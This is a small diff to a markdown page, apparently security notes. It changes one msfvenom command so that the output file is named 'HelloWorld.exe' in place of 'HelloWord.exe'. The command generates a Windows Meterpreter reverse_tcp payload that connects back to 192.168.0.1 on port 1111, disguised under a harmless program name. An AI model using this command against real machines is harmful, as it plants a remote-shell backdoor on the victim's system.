@@ -15,7 +15,7 @@
 #### >　1000110 1001111 1011000
 
 ```bash
-msfvenom -p windows/meterpreter/reverse_tcp lport=1111 lhost=192.168.0.1 -f exe > HelloWord.exe
+msfvenom -p windows/meterpreter/reverse_tcp lport=1111 lhost=192.168.0.1 -f exe > HelloWorld.exe
 ```
 
 <br>
